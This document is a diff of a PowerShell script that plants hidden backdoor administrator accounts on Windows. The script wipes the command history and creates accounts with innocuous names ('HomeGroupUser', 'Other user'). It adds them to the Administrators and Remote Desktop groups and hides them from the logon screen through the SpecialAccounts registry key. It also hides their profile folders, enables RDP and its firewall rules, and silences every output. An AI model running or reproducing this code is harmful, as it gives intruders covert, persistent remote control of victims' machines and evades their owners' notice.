@@ -3,13 +3,14 @@ Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 $currentOnly = Read-Host "[!] are you need do this only current user? "
 
+Clear-Host
+
 Function Generate-Password($length = 30) {
     $lower = "abcdefghijklmnopqrstuvwxyz".ToCharArray()
     $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
     $digits = "0123456789".ToCharArray()
     $symbols = "!@#$%+=-".ToCharArray()
     $all = $lower + $upper + $digits + $symbols
-
     $password = @()
     $password += $lower | Get-Random
     $password += $upper | Get-Random
@@ -17,7 +18,6 @@ Function Generate-Password($length = 30) {
     $password += $symbols | Get-Random
     $remaining = $length - 4
     $password += 1..$remaining | ForEach-Object { $all | Get-Random }
-
     -join ($password | Get-Random -Count $password.Count)
 }
 
@@ -37,30 +37,31 @@ secedit /export /cfg $configFile > $null 2>&1
 
 $lines = [System.Collections.Generic.List[string]](Get-Content $configFile)
 $privRightsIndex = $lines.IndexOf("[Privilege Rights]")
-if ($privRightsIndex -ne -1) {
-    $shutdownIndex = ($lines | Select-String "^SeShutdownPrivilege").LineNumber
-    if ($shutdownIndex) {
-        $lines[$shutdownIndex[0] - 1] = "SeShutdownPrivilege = $adminSID"
-    } else {
-        $lines.Insert($privRightsIndex + 1, "SeShutdownPrivilege = $adminSID")
-    }
+if ($privRightsIndex -eq -1) { exit }
 
+$shutdownIndex = ($lines | Select-String "^SeShutdownPrivilege").LineNumber
+if ($shutdownIndex) {
+    $lines[$shutdownIndex[0] - 1] = "SeShutdownPrivilege = $adminSID"
+} else {
+    $lines.Insert($privRightsIndex + 1, "SeShutdownPrivilege = $adminSID")
+}
+
+if ($currentOnly -ne '1') {
     $denyIndex = ($lines | Select-String "^SeDenyRemoteInteractiveLogonRight").LineNumber
     if ($denyIndex) {
         $lineNum = $denyIndex[0] - 1
         $existing = $lines[$lineNum].Split("=")[1].Trim() -split ","
-        if ($currentOnly -ne '1' -and ($existing -notcontains $currentUser)) {
+        if ($existing -notcontains $currentUser) {
             $existing += $currentUser
         }
         $lines[$lineNum] = "SeDenyRemoteInteractiveLogonRight = " + ($existing -join ",")
-    } elseif ($currentOnly -ne '1') {
+    } else {
         $lines.Insert($privRightsIndex + 2, "SeDenyRemoteInteractiveLogonRight = $currentUser")
     }
-
-    $lines | Set-Content $configFile -Encoding Unicode > $null 2>&1
-    secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet > $null 2>&1
 }
 
+$lines | Set-Content $configFile -Encoding Unicode > $null 2>&1
+secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet > $null 2>&1
 Remove-Item $tempDir -Recurse -Force > $null 2>&1
 
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ShutdownWithoutLogon" -Value 0 -Type DWord > $null
@@ -69,14 +70,14 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\Hid
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideHibernate" -Name "Value" -Value 1 -Type DWord > $null
 
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 > $null
-Enable-NetFirewallRule -DisplayGroup "Remote Desktop" > $null
+Get-NetFirewallRule | Where-Object { $_.Name -like "*RemoteDesktop*" } | Enable-NetFirewallRule > $null
 Set-Service -Name TermService -StartupType Automatic > $null
 Start-Service TermService > $null
 
 $users = @("HomeGroupUser", "Other user")
 $passwords = @{}
-
 $defaultAccountDescription = "A user account managed by the system."
+
 try {
     $defaultAccount = Get-LocalUser -Name "DefaultAccount" -ErrorAction Stop
     $defaultAccountDescription = $defaultAccount.Description
@@ -87,39 +88,50 @@ if ($currentOnly -eq '1') {
     $password = Generate-Password
     net user "$user" $password
     $passwords[$user] = $password
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force > $null }
+    New-ItemProperty -Path $regPath -Name "$user" -PropertyType DWORD -Value 0 -Force > $null
+    $userFolder = "$env:SystemDrive\Users\$user"
+    if (-not (Test-Path $userFolder)) {
+        try {
+            Copy-Item "$env:SystemDrive\Users\Default" $userFolder -Recurse -Force -ErrorAction Stop > $null
+            Sleep 3
+            attrib +h +s "$userFolder"
+        } catch {
+            New-Item -Path $userFolder -ItemType Directory -Force > $null
+            Sleep 3
+            attrib +h +s "$userFolder"
+        }
+    } else {
+        attrib +h +s "$userFolder"
+    }
 } else {
     foreach ($user in $users) {
+        $password = Generate-Password
         try {
-            $userExists = Get-LocalUser -Name "$user" -ErrorAction SilentlyContinue
-            if (-not $userExists) {
-                net user "$user" "Adm!n@93f" /add > $null 2>&1
-                net user "$user" /comment:"$defaultAccountDescription" > $null 2>&1
-                net user "$user" /expires:never > $null 2>&1
-                net user "$user" /active:yes > $null 2>&1
-            }
-
-            $password = Generate-Password
             net user "$user" $password > $null 2>&1
-            Set-LocalUser -Name "$user" -PasswordNeverExpires $true > $null 2>&1
+            net user "$user" $password /domain > $null 2>&1
             $passwords[$user] = $password
-
+            net user "$user" /comment:"$defaultAccountDescription" > $null 2>&1
+            net user "$user" /expires:never > $null 2>&1
+            net user "$user" /active:yes > $null 2>&1
+            Set-LocalUser -Name "$user" -PasswordNeverExpires $true > $null 2>&1
             $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
             if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force > $null }
             New-ItemProperty -Path $regPath -Name "$user" -PropertyType DWORD -Value 0 -Force > $null
-
-            $userForGroup = "$env:COMPUTERNAME\$user"
+            $isDomainUser = ($user -like "*\*")
+            $userForGroup = if ($isDomainUser) { $user } else { "$env:COMPUTERNAME\$user" }
             cmd /c "net localgroup `"$adminGroupName`" `"$userForGroup`" /add" > $null 2>&1
             cmd /c "net localgroup `"$rdpGroupName`" `"$userForGroup`" /add" > $null 2>&1
-
             $userFolder = "$env:SystemDrive\Users\$user"
             if (-not (Test-Path $userFolder)) {
                 try {
                     Copy-Item "$env:SystemDrive\Users\Default" $userFolder -Recurse -Force -ErrorAction Stop > $null
-                    Start-Sleep -Seconds 3
+                    Sleep 3
                     attrib +h +s "$userFolder"
                 } catch {
                     New-Item -Path $userFolder -ItemType Directory -Force > $null
-                    Start-Sleep -Seconds 3
+                    Sleep 3
                     attrib +h +s "$userFolder"
                 }
             } else {
